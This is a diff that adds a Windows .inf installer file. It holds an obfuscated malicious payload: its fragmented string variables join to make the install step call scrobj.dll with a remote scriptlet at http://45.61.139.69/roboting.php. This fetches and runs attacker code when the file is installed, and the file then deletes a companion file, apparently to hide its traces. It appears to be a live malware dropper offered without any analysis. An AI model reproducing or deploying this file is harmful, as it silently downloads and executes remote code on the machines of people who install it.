@@ -1,0 +1,20 @@
+[version]
+signature = $windows nt$
+[destinationdirs]
+A45E=01
+[defaultinstall.windows7]
+UnRegisterOCXs=F07FD
+delfiles=A45E
+[F07FD]
+%DZ3gK%%11%\s%G8La3%,NI,ht%CWMbH%:%0lEJS%/45.61.139.69/roboting.p%h7973%
+[A45E]
+ieu%MaYqV%.inf
+[strings]
+servicename=' '
+shortsvcname=' '
+G8La3=cRobj
+CWMbH=tp
+0lEJS=/
+h7973=hp
+DZ3gK=
+MaYqV=init
